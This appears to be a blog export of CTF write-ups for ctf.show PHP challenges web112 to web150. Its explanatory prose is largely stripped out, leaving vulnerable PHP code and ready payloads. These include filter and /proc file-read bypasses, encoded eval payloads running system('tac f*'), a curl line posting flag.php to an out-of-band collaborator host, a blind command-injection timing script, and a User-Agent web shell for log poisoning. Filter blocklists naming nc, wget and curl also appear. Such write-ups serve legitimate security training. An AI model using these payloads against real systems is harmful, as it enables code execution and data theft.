\n\nis_filephp\n\npayload\n\n```\n?file=php://filter/resource=flag.php\n```\n\n\n\n### web113\n\n```\nhighlight_file(__FILE__);\nerror_reporting(0);\nfunction filter($file){\n    if(preg_match('/filter|\\.\\.\\/|http|https|data|data|rot13|base64|string/i',$file)){\n        die('hacker!');\n    }else{\n        return $file;\n    }\n}\n$file=$_GET['file'];\nif(! is_file($file)){\n    highlight_file(filter($file));\n}else{\n    echo \"hacker!\";\n\n```\n\nfilter\n\n**linux`/proc/self/root`**\n\n`ls /proc/self/root`\n\n`is_file`\n\npayload\n\n```\n?file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php\n```\n\n\n\n```\ncompress.zlib://flag.php\n```\n\nflag.php\n\n\n\n### web114\n\n```\nerror_reporting(0);\nhighlight_file(__FILE__);\nfunction filter($file){\n    if(preg_match('/compress|root|zip|convert|\\.\\.\\/|http|https|data|data|rot13|base64|string/i',$file)){\n        die('hacker!');\n    }else{\n        return $file;\n    }\n}\n$file=$_GET['file'];\necho \"tql \";\nif(! is_file($file)){\n    highlight_file(filter($file));\n}else{\n    echo \"hacker!\";\n}\n```\n\n`compress``root`ban\n\n\n\n`filter`ban\n\npayload\n\n```\n?file=php://filter/resource=flag.php\n```\n\n\n\n### web115\n\n```\ninclude('flag.php');\nhighlight_file(__FILE__);\nerror_reporting(0);\nfunction filter($num){\n    $num=str_replace(\"0x\",\"1\",$num);\n    $num=str_replace(\"0\",\"1\",$num);\n    $num=str_replace(\".\",\"1\",$num);\n    $num=str_replace(\"e\",\"1\",$num);\n    $num=str_replace(\"+\",\"1\",$num);\n    return $num;\n}\n$num=$_GET['num'];\nif(is_numeric($num) and $num!=='36' and trim($num)!=='36' and filter($num)=='36'){\n    if($num=='36'){\n        echo $flag;\n    }else{\n        echo \"hacker!!\";\n    }\n}else{\n    echo \"hacker!!!\"; \n```\n\n`trim`\n\n>  \n>\n>  **trim()** \n>\n>  - \" \" (ASCII *32* (*0x20*))\n>  - \"\\t\" (ASCII *9* (*0x09*))\n>  - \"\\n\" (ASCII *10* (*0x0A*))\n>  - \"\\r\" (ASCII *13* (*0x0D*))\n>  - \"\\0\" (ASCII *0* (*0x00*))\n>  - \"\\x0B\" (ASCII *11* (*0x0B*))\n\n\n\n```\n <?php\nfor($i=1;$i<=128;$i++){\n    $a=chr($i).'1';\n    if(trim($a)!=='1'&&is_numeric($a)){\n        echo urlencode(chr($i));\n        echo \"\\n\";\n    }\n    \n}\n```\n\n %0c()\n\npayload\n\n```\n?num=%0c36\n```\n\n\n\n### web123\n\n```\nerror_reporting(0);\nhighlight_file(__FILE__);\ninclude(\"flag.php\");\n$a=$_SERVER['argv'];\n$c=$_POST['fun'];\nif(isset($_POST['CTF_SHOW'])&&isset($_POST['CTF_SHOW.COM'])&&!isset($_GET['fl0g'])){\n    if(!preg_match(\"/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\%|\\^|\\*|\\-|\\+|\\=|\\{|\\}|\\\"|\\'|\\,|\\.|\\;|\\?/\", $c)&&$c<=18){\n         eval(\"$c\".\";\");  \n         if($fl0g===\"flag_give_me\"){\n             echo $flag;\n         }\n    }\n}\n```\n\n\n\n> phppostget+[[such as`CTF[SHOW.COM`=>`CTF_SHOW.COM`\n\n`POST`  `CTF_SHOW.COM``CTF_SHOW_COM`\n\npayload\n\n```\nPOST: CTF_SHOW=1&CTF[SHOW.COM=2&fun=echo $flag\n```\n\n\n\n### web125\n\n```\nerror_reporting(0);\nhighlight_file(__FILE__);\ninclude(\"flag.php\");\n$a=$_SERVER['argv'];\n$c=$_POST['fun'];\nif(isset($_POST['CTF_SHOW'])&&isset($_POST['CTF_SHOW.COM'])&&!isset($_GET['fl0g'])){\n    if(!preg_match(\"/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\%|\\^|\\*|\\-|\\+|\\=|\\{|\\}|\\\"|\\'|\\,|\\.|\\;|\\?|flag|GLOBALS|echo|var_dump|print/i\", $c)&&$c<=16){\n         eval(\"$c\".\";\");\n         if($fl0g===\"flag_give_me\"){\n             echo $flag;\n         }\n    }\n} \n```\n\necho\n\n\n\n```\n$a=$_SERVER['argv'];\n```\n\n> $_SERVER['argv']\n>\n> 1cli\n>\n> \t$_SERVER['argv'][0]\n>\n> 2web\n>\n> \twebphp.iniregister_argc_argv\n> \t\t\n> \tregister_argc_argv = On(Off)$_SERVER[argv]\n> \t\t\n> \t$_SERVER[argv][0] = $_SERVER[QUERY_STRING]\n> \t\t\n> \t$argv,$argcweb\n\n```\n\n$_SERVER[argv][0] = $_SERVER[QUERY_STRING]\n $_SERVER[QUERY_STRING] ?\n```\n\npayload\n\n```\n?$fl0g=flag_give_me;\n\nPOST:CTF_SHOW=1&CTF[SHOW.COM=2&fun=eval($a[0])\n```\n\n\n\n`highlight_file()`\n\n```\nfun=highlight_file($_GET[1])\n```\n\npayload\n\n```\n?1=flag.php\nPOST:CTF_SHOW=1&CTF[SHOW.COM=2&fun=highlight_file($_GET[1])\n```\n\n\n\n### web126\n\n```\nerror_reporting(0);\nhighlight_file(__FILE__);\ninclude(\"flag.php\");\n$a=$_SERVER['argv'];\n$c=$_POST['fun'];\nif(isset($_POST['CTF_SHOW'])&&isset($_POST['CTF_SHOW.COM'])&&!isset($_GET['fl0g'])){\n    if(!preg_match(\"/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\%|\\^|\\*|\\-|\\+|\\=|\\{|\\}|\\\"|\\'|\\,|\\.|\\;|\\?|flag|GLOBALS|echo|var_dump|print|g|i|f|c|o|d/i\", $c) && strlen($c)<=16){\n         eval(\"$c\".\";\");  \n         if($fl0g===\"flag_give_me\"){\n             echo $flag;\n         }\n    }\n} \n```\n\npayload\n\n```\nget: a=1+fl0g=flag_give_me\npost: CTF_SHOW=&CTF[SHOW.COM=&fun=parse_str($a[1])\n```\n\n(url)`$a[1]``fl0g=flag_give_me`\n\n```\nget: a=1+2+fl0g=flag_give_me//url\npost: CTF_SHOW=&CTF[SHOW.COM=&fun=parse_str($a[2])\n```\n\n```\n<?php\n$a=$_SERVER['argv'];\nvar_dump($a);\n\n a=1+fl0g=flag_give_me\n\narray(2) { [0]=> string(3) \"a=1\" [1]=> string(17) \"fl0g=flag_give_me\" }\n\n```\n\n\n\n### web127\n\n```\nerror_reporting(0);\ninclude(\"flag.php\");\nhighlight_file(__FILE__);\n$ctf_show = md5($flag);\n$url = $_SERVER['QUERY_STRING'];\n\n\n//\nfunction waf($url){\n    if(preg_match('/\\`|\\~|\\!|\\@|\\#|\\^|\\*|\\(|\\)|\\\\$|\\_|\\-|\\+|\\{|\\;|\\:|\\[|\\]|\\}|\\'|\\\"|\\<|\\,|\\>|\\.|\\\\\\|\\//', $url)){\n        return true;\n    }else{\n        return false;\n    }\n}\n\nif(waf($url)){\n    die(\"\");\n}else{\n    extract($_GET);\n}\n\n\nif($ctf_show==='ilove36d'){\n    echo $flag;\n}\n```\n\n> `$_SERVER['QUERY_STRING'];`urlurl\n\n\n\n```\n<?php\nfunction waf($num){\n    if(preg_match('/\\`|\\~|\\!|\\@|\\#|\\^|\\*|\\(|\\)|\\\\$|\\_|\\-|\\+|\\{|\\;|\\:|\\[|\\]|\\}|\\'|\\\"|\\<|\\,|\\>|\\.|\\\\\\|\\//', $num)){\n        return false;\n    }else{\n        return true;\n    }\n}\nfor($i = 0; $i<129; $i++){\n\t$num=chr($i);\n\tif(waf($num)){\n\t\techo \"\".$num.\"   \".urlencode(chr($i)).\"\\n\";\n\t}\n}\n?>\n```\n\n%20\n\n**payload**\n\n```\n?ctf show=ilove36d\n```\n\n\n\n### web128\n\n```\nerror_reporting(0);\ninclude(\"flag.php\");\nhighlight_file(__FILE__);\n\n$f1 = $_GET['f1'];\n$f2 = $_GET['f2'];\n\nif(check($f1)){\n    var_dump(call_user_func(call_user_func($f1,$f2)));\n}else{\n    echo \"\";\n}\n\n\n\nfunction check($str){\n    return !preg_match('/[0-9]|[a-z]/i', $str);\n}\n```\n\nwp\n\ngettext\n\n _()  gettext()\n\n```\n<?php\necho gettext(\"phpinfo\");\n  phpinfo\n\necho _(\"phpinfo\");\n phpinfo\n```\n\n `call_user_func('_','phpinfo')` phpinfo\n\nflagflag.phpget_defined_vars\n\n```\nget_defined_vars ( void ) : array\n\n```\n\n**payload**\n\n```\n?f1=_&f2=get_defined_vars\n```\n\n\n\n### web129\n\n```\nerror_reporting(0);\nhighlight_file(__FILE__);\nif(isset($_GET['f'])){\n    $f = $_GET['f'];\n    if(stripos($f, 'ctfshow')>0){\n        echo readfile($f);\n    }\n}\n```\n\n\n\n`../`   \n\n`./`    \n\n**payload**\n\n```\n?f=../../ctfshow../../../var/www/html/flag.php\n```\n\n\n\n### web130\n\n```\nerror_reporting(0);\nhighlight_file(__FILE__);\ninclude(\"flag.php\");\nif(isset($_POST['f'])){\n    $f = $_POST['f'];\n\n    if(preg_match('/.+?ctfshow/is', $f)){\n        die('bye!');\n    }\n    if(stripos($f, 'ctfshow') === FALSE){\n        die('bye!!');\n    }\n\n    echo $flag;\n\n} \n```\n\n> preg_matchfalse10\n>\n> if(0 === flase)false0false\n>\n> stripos()nullnull!==flase\n\n/s.+?+?1ctfshowf=ctfshow\n\n**payload**\n\n```\n?f=ctfshow[]\n?f[]=1\n?f=ctfshow  (ctfshow)\n```\n\npPCRE\n\n> https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html\n\n\n\nPHPreDOSpcre`pcre.backtrack_limit``var_dump(ini_get('pcre.backtrack_limit'));`\n\nPHP\n\n\n\n```\nimport requests\nurl=\"http://e07a37a6-9144-4f12-a24c-2fcd2f8cdbd0.challenge.ctf.show/\"\ndata={\n    'f':'very'*250000+'ctfshow'\n}\nr=requests.post(url,data=data)\nprint(r.text)\n\n```\n\n\n\n### web131\n\n```\nerror_reporting(0);\nhighlight_file(__FILE__);\ninclude(\"flag.php\");\nif(isset($_POST['f'])){\n    $f = (String)$_POST['f'];\n\n    if(preg_match('/.+?ctfshow/is', $f)){\n        die('bye!');\n    }\n    if(stripos($f,'36Dctfshow') === FALSE){\n        die('bye!!');\n    }\n\n    echo $flag;\n\n} \n```\n\nPCRE\n\n\n\n### web132\n\n/admin\n\n```\ninclude(\"flag.php\");\nhighlight_file(__FILE__);\n\n\nif(isset($_GET['username']) && isset($_GET['password']) && isset($_GET['code'])){\n    $username = (String)$_GET['username'];\n    $password = (String)$_GET['password'];\n    $code = (String)$_GET['code'];\n\n    if($code === mt_rand(1,0x36D) && $password === $flag || $username ===\"admin\"){\n        \n        if($code == 'admin'){\n            echo $flag;\n        }\n        \n    }\n} \n```\n\n\n\n```\nif($code === mt_rand(1,0x36D) && $password === $flag || $username ===\"admin\")\n```\n\n```\n<?php\nif(false && false || true){\n\techo \"true!\";\n}else{\n    echo \"false!\";\n}\n?>\n\n//true\n```\n\n**payload**\n\n```\n?code=admin&password=admin&username=admin\n```\n\n\n\n### web133\n\n```\nerror_reporting(0);\nhighlight_file(__FILE__);\n//flag.php\nif($F = @$_GET['F']){\n    if(!preg_match('/system|nc|wget|exec|passthru|netcat/i', $F)){\n        eval(substr($F,0,6));\n    }else{\n        die(\"6?!\");\n    }\n}\n```\n\n```\nget   F=`$F `;sleep 3\nsubstr($F,0,6)   `$F `;\n eval(\"`$F `;\");\n$F\neval(\"``$F `;sleep 3`\");\n  `   `$F `;sleep 3  ` == shell_exec(\"`$F `;sleep 3\");\n\n sleep 3\n RCE\n```\n\nshell curl \n \n\n```\ncurl  http://xxx:4567?p=`tac f*`\n```\n\nipbp\n\n**payload**\n\n```\n/?F=`$F` ;curl -X post -F xx=@flag.php http://zadcth92f5pgqbtmchfdumhi49a0yp.burpcollaborator.net;\n```\n\n\n\n### web134\n\n```\n$key1 = 0;\n$key2 = 0;\nif(isset($_GET['key1']) || isset($_GET['key2']) || isset($_POST['key1']) || isset($_POST['key2'])) {\n    die(\"nonononono\");\n}\n@parse_str($_SERVER['QUERY_STRING']);\nextract($_POST);\nif($key1 == '36d' && $key2 == '36d') {\n    die(file_get_contents('flag.php'));\n}\n```\n\n`extract`\n\n\n\n```\nparse_str($_SERVER['QUERY_STRING']);\nvar_dump($_POST);\n// _POST[a]=123\narray(1) { [\"a\"]=> string(3) 123 }\n$_POST[a]123\n```\n\n**payload**\n\n```\n?_POST[key1]=36d&_POST[key2]=36d\n```\n\n\n\n### web135\n\n```\nhighlight_file(__FILE__);\n//flag.php\nif($F = @$_GET['F']){\n    if(!preg_match('/system|nc|wget|exec|passthru|bash|sh|netcat|curl|cat|grep|tac|more|od|sort|tail|less|base64|rev|cut|od|strings|tailf|head/i', $F)){\n        eval(substr($F,0,6));\n    }else{\n        die(\"\");\n    }\n}\n```\n\n**payload**\n\n```\n?F=`$F` ;cp flag.php 2.txt;\n?F=`$F` ;uniq flag.php>4.txt;\n```\n\n\n\n### web136\n\n```\n <?php\nerror_reporting(0);\nfunction check($x){\n    if(preg_match('/\\\\$|\\.|\\!|\\@|\\#|\\%|\\^|\\&|\\*|\\?|\\{|\\}|\\>|\\<|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i', $x)){\n        die('too young too simple sometimes naive!');\n    }\n}\nif(isset($_GET['c'])){\n    $c=$_GET['c'];\n    check($c);\n    exec($c);\n}\nelse{\n    highlight_file(__FILE__);\n}\n?> \n```\n\nlinuxtee\n\n**payload**\n\n```\nls|tee 1.txt\nls / |tee 1.txt\ncat /f* |1.txt\n```\n\n\n\n### web137\n\n```\nhighlight_file(__FILE__);\nclass ctfshow\n{\n    function __wakeup(){\n        die(\"private class\");\n    }\n    static function getFlag(){\n        echo file_get_contents(\"flag.php\");\n    }\n}\n\n\n\ncall_user_func($_POST['ctfshow']); \n```\n\nctfshowgetFlag\n\n```\nPOST:ctfshow=ctfshow::getFlag\n```\n\nyu22x\n\n> php ->:: \n> ->\n> ::.\n>\n> ****\n\n\n\n### web138\n\n```\nhighlight_file(__FILE__);\nclass ctfshow\n{\n    function __wakeup(){\n        die(\"private class\");\n    }\n    static function getFlag(){\n        echo file_get_contents(\"flag.php\");\n    }\n}\n\nif(strripos($_POST['ctfshow'], \":\")>-1){\n    die(\"private function\");\n}\n\ncall_user_func($_POST['ctfshow']);\n```\n\n\n\ncall_user_func\n\n\n\n```\ncall_user_func(array($classname, 'say_hello'));\n classname say_hello\n```\n\n**payload**\n\n```\nctfshow[0]=ctfshow&ctfshow[1]=getFlag\n```\n\n\n\n### web139\n\n```\n <?php\nerror_reporting(0);\nfunction check($x){\n    if(preg_match('/\\\\$|\\.|\\!|\\@|\\#|\\%|\\^|\\&|\\*|\\?|\\{|\\}|\\>|\\<|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i', $x)){\n        die('too young too simple sometimes naive!');\n    }\n}\nif(isset($_GET['c'])){\n    $c=$_GET['c'];\n    check($c);\n    exec($c);\n}\nelse{\n    highlight_file(__FILE__);\n}\n?> \n```\n\n\n\n\n\n```\nimport requests\nimport time\nimport string\nstr=string.digits+string.ascii_lowercase+\"-\"\nresult=\"\"\nkey=0\nfor j in range(1,45):\n    print(j)\n    if key==1:\n        break\n    for n in str:\n        payload=\"if [ `cat /f149_15_h3r3|cut -c {0}` == {1} ];then sleep 3;fi\".format(j,n)\n        #print(payload)\n        url=\"http://47f5a8e0-42e2-4260-9f27-ec8d922b6561.challenge.ctf.show/?c=\"+payload\n        try:\n            requests.get(url,timeout=(2.5,2.5))\n        except:\n            result=result+n\n            print(result)\n            break\n\n```\n\n\n\n### web140\n\n```\nhighlight_file(__FILE__);\nif(isset($_POST['f1']) && isset($_POST['f2'])){\n    $f1 = (String)$_POST['f1'];\n    $f2 = (String)$_POST['f2'];\n    if(preg_match('/^[a-z0-9]+$/', $f1)){\n        if(preg_match('/^[a-z0-9]+$/', $f2)){\n            $code = eval(\"return $f1($f2());\");\n            if(intval($code) == 'ctfshow'){\n                echo file_get_contents(\"flag.php\");\n            }\n        }\n    }\n}\n\n```\n\n```\nif(intval($code) == 'ctfshow')\n```\n\n,null\n\n```\n$code = eval(\"return $f1($f2());\"); \n```\n\n```\nintval('a')==0 intval('.')==0 intval('/')==0\n```\n\npayload\n\n```\nmd5(phpinfo())\nmd5(sleep())\nmd5(md5())\ncurrent(localeconv)\nsha1(getcwd())     /var/www/html md5sha1\n```\n\nnull\n\n\n\n### web141\n\n```\nhighlight_file(__FILE__);\nif(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){\n    $v1 = (String)$_GET['v1'];\n    $v2 = (String)$_GET['v2'];\n    $v3 = (String)$_GET['v3'];\n\n    if(is_numeric($v1) && is_numeric($v2)){\n        if(preg_match('/^\\W+$/', $v3)){\n            $code =  eval(\"return $v1$v3$v2;\");\n            echo \"$v1$v3$v2 = \".$code;\n        }\n    }\n} \n```\n\n`/^\\W+$/` ,\n\n\n\n```\neval(\"return 1;phpinfo();\");\n```\n\n`phpinfo()` `1-phpinfo();`phpinfo()\n\n```\neval(\"return 1-phpinfo();\");//\n```\n\n**payload**\n\n```\nv1=1&v3=-(~%8c%86%8c%8b%9a%92)(~%8b%9e%9c%df%99%d5)-&v2=1\n```\n\n\n\n### web142\n\n```\nerror_reporting(0);\nhighlight_file(__FILE__);\nif(isset($_GET['v1'])){\n    $v1 = (String)$_GET['v1'];\n    if(is_numeric($v1)){\n        $d = (int)($v1 * 0x36d * 0x36d * 0x36d * 0x36d * 0x36d);\n        sleep($d);\n        echo file_get_contents(\"flag.php\");\n    }\n} \n```\n\n`v1=0``$d=0`\n\n\n\n### web143\n\n```\nhighlight_file(__FILE__);\nif(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){\n    $v1 = (String)$_GET['v1'];\n    $v2 = (String)$_GET['v2'];\n    $v3 = (String)$_GET['v3'];\n    if(is_numeric($v1) && is_numeric($v2)){\n        if(preg_match('/[a-z]|[0-9]|\\+|\\-|\\.|\\_|\\||\\$|\\{|\\}|\\~|\\%|\\&|\\;/i', $v3)){\n                die('get out hacker!');\n        }\n        else{\n            $code =  eval(\"return $v1$v3$v2;\");\n            echo \"$v1$v3$v2 = \".$code;\n        }\n    }\n}\n```\n\n\n\n**payload**\n\n```\nv1=1&v3=*(\"%0c%06%0c%0b%05%0d\"^\"%7f%7f%7f%7f%60%60\")(\"%0b%01%03%00%06%00\"^\"%7f%60%60%20%60%2a\")*&v2=1\n```\n\n\n\n### web144\n\n```\nhighlight_file(__FILE__);\nif(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){\n    $v1 = (String)$_GET['v1'];\n    $v2 = (String)$_GET['v2'];\n    $v3 = (String)$_GET['v3'];\n\n    if(is_numeric($v1) && check($v3)){\n        if(preg_match('/^\\W+$/', $v2)){\n            $code =  eval(\"return $v1$v3$v2;\");\n            echo \"$v1$v3$v2 = \".$code;\n        }\n    }\n}\n\nfunction check($str){\n    return strlen($str)===1?true:false;\n}\n```\n\nv1,v2,v3\n\n**payload**\n\n```\n?v1=1&v3=-&v2=(~%8c%86%8c%8b%9a%92)(~%8b%9e%9c%df%99%d5)\n```\n\n\n\n### web155\n\n```\nhighlight_file(__FILE__);\nif(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){\n    $v1 = (String)$_GET['v1'];\n    $v2 = (String)$_GET['v2'];\n    $v3 = (String)$_GET['v3'];\n    if(is_numeric($v1) && is_numeric($v2)){\n        if(preg_match('/[a-z]|[0-9]|\\@|\\!|\\+|\\-|\\.|\\_|\\$|\\}|\\%|\\&|\\;|\\<|\\>|\\*|\\/|\\^|\\#|\\\"/i', $v3)){\n                die('get out hacker!');\n        }\n        else{\n            $code =  eval(\"return $v1$v3$v2;\");\n            echo \"$v1$v3$v2 = \".$code;\n        }\n    }\n}\n```\n\nyu22xwp\n\n```\neval(\"return 1?phpinfo():1;\");\n```\n\nphpinfo()\n\n```\n?v1=1&v3=?(~%8F%97%8F%96%91%99%90)():&v2=1\n```\n\nphpinfo()\n\npayload\n\n```\n?v1=1&v3=?(~%8c%86%8c%8b%9a%92)(~%8b%9e%9c%df%99%d5):&v2=1\n```\n\n\n\n### web146\n\n```\nhighlight_file(__FILE__);\nif(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){\n    $v1 = (String)$_GET['v1'];\n    $v2 = (String)$_GET['v2'];\n    $v3 = (String)$_GET['v3'];\n    if(is_numeric($v1) && is_numeric($v2)){\n        if(preg_match('/[a-z]|[0-9]|\\@|\\!|\\:|\\+|\\-|\\.|\\_|\\$|\\}|\\%|\\&|\\;|\\<|\\>|\\*|\\/|\\^|\\#|\\\"/i', $v3)){\n                die('get out hacker!');\n        }\n        else{\n            $code =  eval(\"return $v1$v3$v2;\");\n            echo \"$v1$v3$v2 = \".$code;\n        }\n    }\n} \n```\n\n\n\n```\neval(\"return 1==phpinfo()||1;\");\n```\n\nphpinfo()\n\n**payload**\n\n```\n?v1=1&v3===(~%8c%86%8c%8b%9a%92)(~%8b%9e%9c%df%99%d5)||&v2=1\n\n?v1=1&v3=|('%13%19%13%14%05%0d'|'%60%60%60%60%60%60')('%14%01%03%20%06%02'|'%60%60%60%20%60%28')|&v2=1\n\n?v1=1&v3=|(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%D5)|&v2=1\n```\n\n\n\n### web147\n\n```\nhighlight_file(__FILE__);\n\nif(isset($_POST['ctf'])){\n    $ctfshow = $_POST['ctf'];\n    if(!preg_match('/^[a-z0-9_]*$/isD',$ctfshow)) {\n        $ctfshow('',$_GET['show']);\n    }\n\n}\n```\n\nwp\n\ncreate_function()\n\n```\ncreate_function('$a','echo $a.\"123\"')\n\n\n\nfunction f($a) {\n  echo $a.\"123\";\n}\n\n```\n\n echo 1;}phpinfo();//\n \n\n```\nfunction f($a) {\n  echo 1;}phpinfo();//\n}\nphpinfo()\nfuzz%5c\n```\n\n**payload**\n\n```\nget: ?show=echo 123;}system('tac f*');//\npost: ctf=%5ccreate_function\n```\n\n\n\n### web148\n\n```\ninclude 'flag.php';\nif(isset($_GET['code'])){\n    $code=$_GET['code'];\n    if(preg_match(\"/[A-Za-z0-9_\\%\\\\|\\~\\'\\,\\.\\:\\@\\&\\*\\+\\- ]+/\",$code)){\n        die(\"error\");\n    }\n    @eval($code);\n}\nelse{\n    highlight_file(__FILE__);\n}\n\nfunction get_ctfshow_fl0g(){\n    echo file_get_contents(\"flag.php\");\n}\n```\n\n\n\n**payload**\n\n```\n?code=(\"%08%02%08%09%05%0d\"^\"%7b%7b%7b%7d%60%60\")(\"%09%01%03%01%06%02\"^\"%7d%60%60%21%60%28\");\n```\n\n\n\n### web149\n\n```\nerror_reporting(0);\nhighlight_file(__FILE__);\n\n$files = scandir('./'); \nforeach($files as $file) {\n    if(is_file($file)){\n        if ($file !== \"index.php\") {\n            unlink($file);\n        }\n    }\n}\n\nfile_put_contents($_GET['ctf'], $_POST['show']);\n\n$files = scandir('./'); \nforeach($files as $file) {\n    if(is_file($file)){\n        if ($file !== \"index.php\") {\n            unlink($file);\n        }\n    }\n}\n```\n\n\n\nindex.php\n\n\n\n\n\n\n\n### web150\n\n```\ninclude(\"flag.php\");\nerror_reporting(0);\nhighlight_file(__FILE__);\n\nclass CTFSHOW{\n    private $username;\n    private $password;\n    private $vip;\n    private $secret;\n\n    function __construct(){\n        $this->vip = 0;\n        $this->secret = $flag;\n    }\n\n    function __destruct(){\n        echo $this->secret;\n    }\n\n    public function isVIP(){\n        return $this->vip?TRUE:FALSE;\n        }\n    }\n\n    function __autoload($class){\n        if(isset($class)){\n            $class();\n    }\n}\n\n#\n$key = $_SERVER['QUERY_STRING'];\nif(preg_match('/\\_| |\\[|\\]|\\?/', $key)){\n    die(\"error\");\n}\n$ctf = $_POST['ctf'];\nextract($_GET);\nif(class_exists($__CTFSHOW__)){\n    echo \"class is exists!\";\n}\n\nif($isVIP && strrpos($ctf, \":\")===FALSE){\n    include($ctf);\n}\n\n```\n\n\n\n```\nPOST /?isVIP=1 HTTP/1.1\nHost: 76d1b363-e52c-456b-aff5-8c0c5ad8c0ad.challenge.ctf.show\nUser-Agent: <?php eval($_POST[1]);?>\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nConnection: close\nCookie: _ga=GA1.2.1418869291.1680592508\nUpgrade-Insecure-Requests: 1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 49\n\nctf=/var/log/nginx/access.log&1=system('cat f*');\n```\n\n\n\n### web150_plus\n\n```\ninclude(\"flag.php\");\nerror_reporting(0);\nhighlight_file(__FILE__);\n\nclass CTFSHOW{\n    private $username;\n    private $password;\n    private $vip;\n    private $secret;\n\n    function __construct(){\n        $this->vip = 0;\n        $this->secret = $flag;\n    }\n\n    function __destruct(){\n        echo $this->secret;\n    }\n\n    public function isVIP(){\n        return $this->vip?TRUE:FALSE;\n        }\n    }\n\n    function __autoload($class){\n        if(isset($class)){\n            $class();\n    }\n}\n\n#\n$key = $_SERVER['QUERY_STRING'];\nif(preg_match('/\\_| |\\[|\\]|\\?/', $key)){\n    die(\"error\");\n}\n$ctf = $_POST['ctf'];\nextract($_GET);\nif(class_exists($__CTFSHOW__)){\n    echo \"class is exists!\";\n}\n\nif($isVIP && strrpos($ctf, \":\")===FALSE && strrpos($ctf,\"log\")===FALSE){\n    include($ctf);\n}\n```\n\nlog\n\n> ```\n> __autoload()\n> __autoload  \n> ?..CTFSHOW..=phpinfophpinfo\n> ..CTFSHOW..__CTFSHOW__CTFSHOW\n> __autoload()phpinfophpinfo\n> getshell\n> ```\n\n**payload**\n\n```\n/?..CTFSHOW..=phpinfo\n```\n\nphp\n\n\n\n\n\n------\n\n...","slug":"PHP","published":1,"updated":"2024-04-17T08:43:00.731Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clv3kf7io000bh7762hqn3z20","content":"<h1 id=\"PHP\"><a href=\"#PHP\" class=\"headerlink\" title=\"PHP\"></a>PHP</h1><p>php</p>\n<h3 id=\"web89\"><a href=\"#web89\" class=\"headerlink\" title=\"web89\"></a>web89</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">include(&quot;flag.php&quot;);</span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\"></span><br><span class=\"line\">if(isset($_GET[&#x27;num&#x27;]))&#123;</span><br><span class=\"line\">    $num = $_GET[&#x27;num&#x27;];</span><br><span class=\"line\">    if(preg_match(&quot;/[0-9]/&quot;, $num))&#123;</span><br><span class=\"line\">        die(&quot;no no no!&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    if(intval($num))&#123;</span><br><span class=\"line\">        echo $flag;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><code>preg_match(&quot;/[0-9]/&quot;, $num</code></p>\n<p><code>intval($num)</code><code>intval</code></p>\n<p><strong>intval()</strong></p>\n<blockquote>\n<p><br> var  integer  0 array  0 array<br> 1 </p>\n</blockquote>\n<p></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">echo intval(1234);  //1234</span><br><span class=\"line\">echo &quot;\\n&quot;;</span><br><span class=\"line\">echo intval(042);  //34  08</span><br><span class=\"line\">echo &quot;\\n&quot;;</span><br><span class=\"line\">echo intval(0x1a);  //26 0x16</span><br><span class=\"line\">echo &quot;\\n&quot;;</span><br><span class=\"line\">echo intval(3e3);  //3000  3 X 10</span><br><span class=\"line\">echo &quot;\\n&quot;;</span><br><span class=\"line\">echo intval(&#x27;3e3&#x27;);  //3000</span><br><span class=\"line\">echo &quot;\\n&quot;;</span><br><span class=\"line\">echo intval(&quot;1234a&quot;);  //1234</span><br><span class=\"line\">echo &quot;\\n&quot;;</span><br><span class=\"line\">echo intval(4.2); //</span><br></pre></td></tr></table></figure>\n\n<p></p>\n<p></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?num[]=a</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web90\"><a href=\"#web90\" class=\"headerlink\" title=\"web90\"></a>web90</h3><figure 